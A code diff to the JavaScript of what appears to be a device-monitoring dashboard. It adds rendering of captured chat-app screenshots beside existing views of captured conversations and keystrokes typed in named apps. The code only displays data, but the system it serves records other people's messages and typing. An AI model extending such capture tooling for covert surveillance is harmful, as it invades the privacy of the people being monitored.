@@ -817,6 +817,16 @@ function buildActivityDetail(a) {
             </div>`;
     }
 
+    // Screenshot image for chat captures
+    let shotHtml = '';
+    if (a.activity_type === 'chat_screenshot' && a.data && (a.data.image_url || a.data.media_id)) {
+        const src = a.data.image_url || `/api/files/${a.data.media_id}`;
+        shotHtml = `<div style="margin:0 0 10px;">
+            <div class="activity-detail-label" style="margin-bottom:6px;">📸 Screen capture — ${escHtml(String(a.data.reason || 'chat').replace(/_/g, ' '))}</div>
+            <img class="act-screenshot" src="${escAttr(src)}" onclick="openLightbox('${escAttr(src)}')" alt="chat screenshot">
+        </div>`;
+    }
+
     // Highlighted typed-text block for keystroke captures
     let typedHtml = '';
     if (a.activity_type === 'text_input' && a.data && a.data.text) {
@@ -850,11 +860,12 @@ function buildActivityDetail(a) {
         rawHtml = `<div class="activity-data-raw">${escHtml(JSON.stringify(data, null, 2))}</div>`;
     }
 
-    return `${chatHtml}${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
+    return `${shotHtml}${chatHtml}${typedHtml}<div class="activity-detail-grid">${gridHtml}</div>${rawHtml}`;
 }
 
 // Row label + inline preview for the activity list
 function activityLabel(a) {
+    if (a.activity_type === 'chat_screenshot') return '📸 Screenshot in ' + (a.app_name || a.package_name || 'Chat app');
     if (a.activity_type === 'chat_capture') return '💬 Conversation in ' + (a.app_name || a.package_name || 'Chat app');
     if (a.activity_type === 'text_input') return '⌨ Typed in ' + (a.app_name || a.package_name || 'App');
     return a.app_name || a.activity_type || 'Activity';
@@ -865,6 +876,10 @@ function activityPreview(a) {
         const first = String(a.data.messages[0] || '').substring(0, 90);
         const more = a.data.messages.length > 1 ? ` <span class="activity-preview-more">+${a.data.messages.length - 1} more</span>` : '';
         return first ? `<div class="activity-preview">${escHtml(first)}${more}</div>` : '';
+    }
+    if (a.activity_type === 'chat_screenshot' && a.data && (a.data.image_url || a.data.media_id)) {
+        const src = a.data.image_url || `/api/files/${a.data.media_id}`;
+        return `<img class="activity-preview-thumb" src="${escAttr(src)}" alt="screenshot">`;
     }
     if (a.activity_type === 'text_input' && a.data && a.data.text) {
         return `<div class="activity-preview">${escHtml(String(a.data.text).substring(0, 90))}</div>`;
